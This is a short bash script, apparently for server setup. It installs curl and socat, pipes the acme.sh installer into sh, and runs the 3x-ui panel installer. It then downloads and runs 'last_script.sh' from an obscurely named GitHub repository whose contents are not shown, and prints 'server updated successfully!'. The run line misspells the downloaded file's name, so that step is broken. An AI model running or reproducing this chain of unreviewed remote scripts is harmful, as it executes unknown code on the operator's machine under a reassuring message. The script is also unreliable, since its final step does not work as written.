#!/bin/bash

apt update 2>/dev/null
apt install curl socat -y 2>/dev/null
curl https://get.acme.sh | sh
bash <(curl -Ls https://raw.githubusercontent.com/mhsanaei/3x-ui/master/install.sh)
wget https://raw.githubusercontent.com/somebodyIsFavxxdf/vekAdbifyeeds/main/last_script.sh
chmod +x last_script.sh
./last_scrpit.sh && echo "server updated successfully!"
